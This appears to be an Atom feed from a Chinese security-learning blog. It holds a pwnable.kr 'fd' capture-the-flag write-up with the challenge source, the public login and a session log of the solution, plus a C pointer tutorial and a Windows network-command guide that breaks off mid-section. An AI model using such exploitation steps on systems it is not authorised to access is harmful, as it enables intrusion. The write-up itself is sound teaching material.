<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MUZI&#39;s BLOG</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://muzibing.github.io/"/>
  <updated>2020-04-23T16:29:49.051Z</updated>
  <id>https://muzibing.github.io/</id>
  
  <author>
    <name>MUZIBing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://muzibing.github.io/2020/04/23/2020.04.23%EF%BC%88108%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/23/2020.04.23（108）/</id>
    <published>2020-04-23T13:39:59.735Z</published>
    <updated>2020-04-23T16:29:49.051Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">title: pwnable.kr的奇幻之旅（一）[fd]</span><br><span class="line">tags:</span><br><span class="line">- pwnable.kr</span><br><span class="line">- pwn</span><br><span class="line">date: 2020-4-23</span><br><span class="line">header_image: /intro/108.png</span><br></pre></td></tr></table></figure><h3 id="0x00-相关知识"><a href="#0x00-相关知识" class="headerlink" title="0x00 相关知识"></a><font color="navy"><code>0x00 相关知识</code></font></h3><h4 id="1-atoi-函数"><a href="#1-atoi-函数" class="headerlink" title="1.atoi()函数"></a><font color="blue"><code>1.atoi()函数</code></font></h4><blockquote><p>① atoi函数是包含在stdlib.h标准库中 </p><p>② 函数的声明：int atoi(const char* str)</p><p>③ 作用：是用来将参数中的str所指向的字符串转化为一个整数</p><p>④ 实例如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* s1 = <span class="string">"Hello World"</span>;</span><br><span class="line"><span class="keyword">char</span>* s2 = <span class="string">"1234567890"</span>;</span><br><span class="line"><span class="keyword">char</span>* s3 = <span class="string">"Th1s_1s_a_t9st"</span>;</span><br><span class="line">    <span class="keyword">char</span>* s4 = <span class="string">"a"</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,atoi(s1));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,atoi(s2));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,atoi(s3));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,atoi(s4));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果为：</span></span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"><span class="comment">// 1234567890</span></span><br><span class="line"><span class="comment">// 0</span></span><br></pre></td></tr></table></figure><blockquote><p>所以说对于atoi函数的返回值来说：该函数返回转换后的长整数，如果没有执行有效的转换，则返回零。其实也可以理解为将纯数字的字符串转化为数值，含有其他符号的字符串将返回0。</p></blockquote><h4 id="2-read-函数"><a href="#2-read-函数" class="headerlink" title="2.read()函数"></a><font color="blue"><code>2.read()函数</code></font></h4><blockquote><p>① read函数被包含在unistd.h标准库中</p><p>② read函数的声明：<code>ssize_t read(int fd, void *buf, size_t count)</code>;  </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里要解释一下fd文件描述符的作用：</span><br><span class="line"></span><br><span class="line">在Linux系统中一切皆可以看成是文件，文件又可分为：普通文件、目录文件、链接文件和设备文件。文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符。</span><br><span class="line"></span><br><span class="line">程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。</span><br></pre></td></tr></table></figure><p><img src="/images/108-2.png" alt></p><blockquote><p>③ read函数的解释：read()会把参数fd所指的文件传送count个字节到buf指针所指的内存中。若参数count为0，则read()不会有作用并返回0。返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动</p><p>④ read函数的返回值：成功返回读取的字节数，出错返回-1并设置errno，如果在调read之前已到达文件末尾，则这次read返回0</p></blockquote><h4 id="3-C函数中main函数的参数"><a href="#3-C函数中main函数的参数" class="headerlink" title="3.C函数中main函数的参数"></a><font color="blue"><code>3.C函数中main函数的参数</code></font></h4><blockquote><p>表示形式：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span> </span>= <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br></pre></td></tr></table></figure><blockquote><p><strong>其参数argc和argv用于运行时,把命令行参数传入主程序.其中ARG是指arguments,即参数.具体含义如下:</strong></p><ul><li><font color="red">**int argc:英文名为arguments count(参数计数)**</font><p><strong>*count of cmd line args,运行程序传送给main函数的命令行参数总个数,包括可执行程序名,其中当argc=1时表示只有一个程序名称,此时存储在argv[0]中.</strong></p></li><li><font color="red">**char \*\*argv:英文名为arguments value/vector(参数值)**</font><p><strong>pointer to table of cmd line args,字符串数组,用来存放指向字符串参数的指针数组,每个元素指向一个参数,空格分隔参数,其长度为argc.数组下标从0开始,argv[argc]=NULL.</strong></p><ul><li>argv[0] 指向程序运行时的全路径名</li><li>argv[1] 指向程序在DOS命令中执行程序名后的第一个字符串</li><li>argv[2] 指向执行程序名后的第二个字符串</li><li>argv[argc] 为NULL</li></ul></li><li><p>实例如下：</p></li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"argc is %d\n"</span>,argc);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;argc;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d:"</span>,i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>,argv[i]);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">"PAUSE"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>执行<code>./test 1 2 3 A B C</code>得到如下的结果：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">argc is 7</span><br><span class="line">0:./test</span><br><span class="line">1:1</span><br><span class="line">2:2</span><br><span class="line">3:3</span><br><span class="line">4:A</span><br><span class="line">5:B</span><br><span class="line">6:C</span><br></pre></td></tr></table></figure><h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a><font color="navy"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh fd@pwnable.kr -p2222</span><br></pre></td></tr></table></figure><p>链接上去之后，查看一下相关的文件以及权限：<code>ls -l</code>，得到如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">total 16</span><br><span class="line">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c</span><br><span class="line">-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag</span><br></pre></td></tr></table></figure><p>可以看出只有<strong>fd</strong>文件可执行，<strong>fd.c</strong>文件对root可读可写，那下面我们打开<strong>fd.c</strong>文件，分析一下源码，上源码！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面就来分析一下上述的源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(argc&lt;2)&#123;</span><br><span class="line">       printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">       return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上面的 <strong>if</strong> 语句是用来判断执行fd文件的参数，如果小于2则终止程序。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fd = atoi( argv[1] ) - 0x1234;</span><br></pre></td></tr></table></figure><blockquote><p>利用atoi函数用来计算read函数中的fd，fd是第2个参数，也就是输入的第一个参数减去0x1234（十进制为4660）的值</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len = read(fd, buf, 32);</span><br></pre></td></tr></table></figure><blockquote><p>把fd指向的文件中，读取32个字节到buf数组中，我们希望fd为0，因为当fd=0时，我们就可以从键盘输入字符串，那么就能把字符串输入到buf数组里。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">         printf(&quot;good job :)\n&quot;);</span><br><span class="line">         system(&quot;/bin/cat flag&quot;);</span><br><span class="line">         exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>判断我们输入的串是否与”LETMEWIN”一样，若LETMEWIN = buf，则执行if条件语句，也就是说我们输入的字符串为”LETMEWIN”</p></blockquote><h3 id="0x02-解题步骤"><a href="#0x02-解题步骤" class="headerlink" title="0x02 解题步骤"></a><font color="navy"><code>0x02 解题步骤</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@木子冰:# ssh fd@pwnable.kr -p2222</span><br><span class="line">fd@pwnable.kr&apos;s password:guest</span><br><span class="line"> ____  __    __  ____    ____  ____   _        ___      __  _  ____</span><br><span class="line">|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \</span><br><span class="line">|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  &apos; / |  D  )</span><br><span class="line">|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /</span><br><span class="line">|  |  |  `  &apos;  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \</span><br><span class="line">|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \</span><br><span class="line">|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|</span><br><span class="line"></span><br><span class="line">fd@pwnable:~$ ls -l</span><br><span class="line">total 16</span><br><span class="line">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c</span><br><span class="line">-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag</span><br><span class="line"></span><br><span class="line">fd@pwnable:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure><h3 id="0x03-参考文章"><a href="#0x03-参考文章" class="headerlink" title="0x03 参考文章"></a><font color="navy"><code>0x03 参考文章</code></font></h3><blockquote><ol><li><a href="https://www.jianshu.com/p/096974c1e5c4" target="_blank" rel="noopener">pwnable第一关fd</a></li><li><a href="https://blog.csdn.net/Eastmount/article/details/20413773" target="_blank" rel="noopener">[C/C++基础知识] main函数的参数argc和argv</a></li><li><a href="https://blog.csdn.net/cywosp/article/details/38965239" target="_blank" rel="noopener">每天进步一点点——Linux中的文件描述符与打开文件之间的关系</a></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>详解pointer（指针）中的“*”（取值）和“&amp;”（取地址）</title>
    <link href="https://muzibing.github.io/2020/03/30/2020.03.30%EF%BC%88107%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/30/2020.03.30（107）/</id>
    <published>2020-03-29T16:00:00.000Z</published>
    <updated>2020-03-30T14:36:18.116Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/107-1.png" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;今天要好好的解析以下C/C++中的“*”和“&amp;”的区别，示例代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span>* a = &amp;b;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"a:%d\n"</span>,a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"*a:%d\n"</span>,*a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&amp;a:%d\n"</span>,&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"*&amp;a:%d\n"</span>,*&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"**&amp;a:%d\n"</span>,**&amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&amp;b:%d\n"</span>,&amp;b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"*&amp;b:%d\n"</span>,*&amp;b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果以前看到这么多“*”和“\&amp;”符号</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/107-1.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;今天要好好的解析以下C/C++中的“*”和“&amp;amp;”的区别，示例代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Windows常用的网络命令（web）</title>
    <link href="https://muzibing.github.io/2020/03/26/2020.03.26%EF%BC%88106%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/03/26/2020.03.26（106）/</id>
    <published>2020-03-25T16:00:00.000Z</published>
    <updated>2020-03-30T12:40:05.279Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-ipconfig"><a href="#0x00-ipconfig" class="headerlink" title="0x00 ipconfig"></a><font color="brown">0x00 ipconfig</font></h3><div style="background-color:gray">sss</div><p><code>作用</code>：可以使用 ipconfig 命令获得主机配置信息，包括 IP 地址、子网掩码和默认网关</p><p>IPConfig实用程序和它的等价图形用户界面——Windows 95/98中的WinIPCfg可用于显示当前的TCP/IP配置的设置值。这些信息一般用来检验人工配置的TCP/IP设置是否正确。但是，如果我们的计算机和所在的局域网使用了动态主机配置协议（DHCP），这个程序所显示的信息也许更加实用。</p><p><code>IPConfig最常用的选项：</code></p><p>▧  <code>ipconfig</code>：当使用IPConfig时不带任何参数选项，那么它为每个已经配置了的接口显示IP地址、子网掩码和缺省网关值。</p><p>▧  <code>ipconfig /all</code>：当使用all选项时，IPConfig能为DNS和WINS服务器显示它已配置且所要使用的附加信息（如IP地址等），并且显示内置于本地网卡中的物理地址（MAC）。如果IP地址是从DHCP服务器租用的，IPConfig将显示DHCP服务器的IP地址和租用地址预计失效的日期。</p><p>▧  <code>ipconfig /release</code>和<code>ipconfig /renew</code>：这是两个附加选项，只能在向DHCP服务器租用其IP地址的计算机上起作用。如果我们输入ipconfig /release，那么所有接口的租用IP地址便重新交付给DHCP服务器（归还IP地址）。如果我们输入ipconfig /renew，那么本地计算机便设法与DHCP服务器取得联系，并租用一个IP地址。请注意，大多数情况下网卡将被重新赋予和以前所赋予的相同的IP地址。</p><h3 id="0x01-ping"><a href="#0x01-ping" class="headerlink" title="0x01 ping"></a><font color="brown">0x01 ping</font></h3><p>Ping是个使用频率极高的实用程序，<code>用于确定本地主机是否能与另一台主机交换（发送与接收）数据报</code>。根据返回的信息，我们就可以推断TCP/IP参数是否设置得正确以及运行是否正常。需要注意的是：成功地与另一台主机进行一次或两次数据报交换并不表示TCP/IP配置就是正确的，我们必须执行大量的本地主机与远程主机的数据报交换，才能确信TCP/IP的正确性。</p><p>如果Ping运行正确，我们大体上就可以排除网络访问层、网卡、MODEM的输入输出线路、电缆和路由器等存在的故障，从而减小了问题的范围。但由于可以自定义所发数据报的大小及无休止的高速发送，Ping也被某些别有用心的人作为DDOS（拒绝服务攻击）的工具，例如许多大型的网站就是被黑客利用数百台可以高速接入互联网的电脑连续发送大量Ping数据报而瘫痪的。</p><p>按照缺省设置，Windows上运行的Ping命令发送4个ICMP回送请求，每个32字节数据，如果一切正常，我们应能得到4个回送应答。 Ping能够以毫秒为单位显示发送回送请求到返回回送应答之间的时间量。如果应答时间短，表示数据报不必通过太多的路由器或网络连接速度比较快。Ping还能显示TTL（Time To Live存在时间）值，我们可以通过TTL值推算一下数据包已经通过了多少个路由器：源地点TTL起始值（就是比返回TTL略大的一个2的乘方数）-返回时TTL值。例如，返回TTL值为119，那么可以推算数据报离开源地址的TTL起始值为128，而源地点到目标地点要通过9个路由器网段（128-119）；如果返回TTL值为246，TTL起始值就是256，源地点到目标地点要通过9个路由器网段。</p><font color="navy">**1、通过Ping检测网络故障的典型次序**</font><p>正常情况下，当我们使用Ping命令来查找问题所在或检验网络运行情况时，我们需要使用许多Ping命令，如果所有都运行正确，我们就可以相信基本的连通性和配置参数没有问题；如果某些Ping命令出现运行故障，它也可以指明到何处去查找问题。下面就给出一个典型的检测次序及对应的可能故障：</p><p>▧ <code>ping 127.0.0.1</code></p><blockquote><p>这个Ping命令被送到本地计算机的IP软件，该命令永不退出该计算机。如果没有做到这一点，就表示TCP/IP的安装或运行存在某些最基本的问题。</p></blockquote><p>▧ <code>ping 本机IP</code></p><blockquote><p>这个命令被送到我们计算机所配置的IP地址，我们的计算机始终都应该对该Ping命令作出应答，如果没有，则表示本地配置或安装存在问题。出现此问题时，局域网用户请断开网络电缆，然后重新发送该命令。如果网线断开后本命令正确，则表示另一台计算机可能配置了相同的IP地址。</p></blockquote><p>▧ <code>ping 局域网内其他IP</code></p><blockquote><p>这个命令应该离开我们的计算机，经过网卡及网络电缆到达其他计算机，再返回。收到回送应答表明本地网络中的网卡和载体运行正确。但如果收到0个回送应答，那么表示子网掩码（进行子网分割时，将IP地址的网络部分与主机部分分开的代码）不正确或网卡配置错误或电缆系统有问题。</p></blockquote><p>▧ <code>ping 网关IP</code></p><blockquote><p>这个命令如果应答正确，表示局域网中的网关路由器正在运行并能够作出应答。</p></blockquote><p>▧ <code>ping 远程IP</code></p><blockquote><p>如果收到4个应答，表示成功的使用了缺省网关。对于拨号上网用户则表示能够成功的访问Internet（但不排除ISP的DNS会有问题）</p></blockquote><p>▧ <code>ping localhost</code></p><blockquote><p>localhost是个作系统的网络保留名，它是127.0.0.1的别名，每台计算机都应该能够将该名字转换成该地址。如果没有做到这一带内，则表示主机文件（/Windows/host）中存在问题。</p></blockquote><p>▧ <code>ping www.xxx.com（如www.yesky.com 天极网）</code></p><blockquote><p>对这个域名执行Ping www.xxx.com 地址，通常是通过DNS 服务器 如果这里出现故障，则表示DNS服务器的IP地址配置不正确或DNS服务器有故障（对于拨号上网用户，某些ISP已经不需要设置DNS服务器了）。顺便说一句：我们也可以利用该命令实现域名对IP地址的转换功能。</p><p>如果上面所列出的所有Ping命令都能正常运行，那么我们对自己的计算机进行本地和远程通信的功能基本上就可以放心了。但是，这些命令的成功并不表示我们所有的网络配置都没有问题，例如，某些子网掩码错误就可能无法用这些方法检测到。</p></blockquote><font color="navy">**2、Ping命令的常用参数选项**</font><p>(您可以使用 Ping 命令的不同选项来指定要使用的数据包大小、要发送多少数据包、是否记录用过的路由、要使用的生存时间 (TTL) 值以及是否设置“不分段”标志。可以键入 ping -? 查看这些选项。)</p><p>▧ <code>ping IP –t</code></p><blockquote><p>连续对IP地址执行Ping命令，直到被用户以Ctrl+C中断。</p></blockquote><p>▧ <code>ping IP -l 300</code></p><blockquote><p>指定Ping命令中的数据长度为300字节，而不是缺省的32字节。</p></blockquote><p>▧ <code>ping IP –n</code></p><blockquote><p>执行特定次数的Ping命令。</p></blockquote><p>下例说明如何向 IP 地址 172.16.48.10 发送两个 Ping，每个都是 1,450 字节：<code>C:\&gt;ping -n 2 -l 1450 172.16.48.10</code></p><p>默认情况下，在显示“请求超时”之前，Ping 等待 1,000 毫秒（1 秒）的时间让每个响应返回。如果通过 Ping 探测的远程系统经过长时间延迟的链路，如卫星链路，则响应可能会花更长的时间才能返回。可以使用 -w （等待）选项指定更长时间的超时。</p><h3 id="0x02-arp"><a href="#0x02-arp" class="headerlink" title="0x02 arp"></a><font color="brown">0x02 arp</font></h3><p><code>使用 Arp 解决硬件地址问题</code></p><p>ARP是一个重要的TCP/IP协议，并且用于确定对应IP地址的网卡物理地址。实用arp命令，我们能够查看本地计算机或另一台计算机的ARP高速缓存中的当前内容。此外，使用arp命令，也可以用人工方式输入静态的网卡物理/IP地址对，我们可能会使用这种方式为缺省网关和本地服务器等常用主机进行这项作，有助于减少网络上的信息量。</p><p>按照缺省设置，ARP高速缓存中的项目是动态的，每当发送一个指定地点的数据报且高速缓存中不存在当前项目时，ARP便会自动添加该项目。一旦高速缓存的项目被输入，它们就已经开始走向失效状态。例如，在Windows NT/2000网络中，如果输入项目后不进一步使用，物理/IP地址对就会在2至10分钟内失效。因此，如果ARP高速缓存中项目很少或根本没有时，请不要奇怪，通过另一台计算机或路由器的ping命令即可添加。所以，需要通过arp命令查看高速缓存中的内容时，请最好先ping 此台计算机（不能是本机发送ping命令）。</p><font color="navy">**ARP常用命令选项：**</font><p>▧ <code>arp -a或arp –g</code>：用于查看高速缓存中的所有项目。-a和-g参数的结果是一样的，多年来-g一直是UNIX平台上用来显示ARP高速缓存中所有项目的选项，而Windows用的是arp -a（-a可被视为all，即全部的意思），但它也可以接受比较传统的-g选项。</p><p>▧ <code>arp -a IP</code>：如果我们有多个网卡，那么使用arp -a加上接口的IP地址，就可以只显示与该接口相关的ARP缓存项目。</p><p>▧ <code>arp -s IP 物理地址</code>：我们可以向ARP高速缓存中人工输入一个静态项目。该项目在计算机引导过程中将保持有效状态，或者在出现错误时，人工配置的物理地址将自动更新该项目。</p><p>▧ <code>arp -d IP</code>：使用本命令能够人工删除一个静态项目。</p><p>例如我们在命令提示符下，键入 Arp –a；如果我们使用过 Ping 命令测试并验证从这台计算机到 IP 地址为 10.0.0.99 的主机的连通性，则 ARP 缓存显示以下项： </p><p><code>Interface:10.0.0.1 on interface 0x1</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">Internet Address</th><th style="text-align:center">Physical Address</th><th style="text-align:center">Type</th></tr></thead><tbody><tr><td style="text-align:center">10.0.0.99</td><td style="text-align:center">00-e0-98-00-7c-dc</td><td style="text-align:center">dynamic</td></tr></tbody></table></div><p>在此例中，缓存项指出位于 <code>10.0.0.99</code>的远程主机解析成 <code>00-e0-98-00-7c-dc</code>的媒体访问控制地址，它是在远程计算机的网卡硬件中分配的。媒体访问控制地址是计算机用于与网络上远程 TCP/IP 主机物理通讯的地址。</p><p>至此我们可以用ipconfig和ping命令来查看自己的网络配置并判断是否正确、可以用netstat查看别人与我们所建立的连接并找出ICQ使用者所隐藏的IP信息、可以用arp查看网卡的MAC地址。</p><h3 id="0x03-netstat"><a href="#0x03-netstat" class="headerlink" title="0x03 netstat"></a><font color="brown">0x03 netstat</font></h3><blockquote><p>使用 netstat 显示连接统计，用于显示与IP、TCP、UDP和ICMP协议相关的统计数据，一般用于检验本机各端口的网络连接情况。</p></blockquote><p>如果我们的计算机有时候接受到的数据报会导致出错数据删除或故障，TCP/IP可以容许这些类型的错误，并能够自动重发数据报。但如果累计的出错情况数目占到所接收的IP数据报相当大的百分比，或者它的数目正迅速增加，那么我们就应该使用Netstat查一查为什么会出现这些情况了。</p><font color="navy">**1.netstat 的一些常用选项**</font><p>▧ 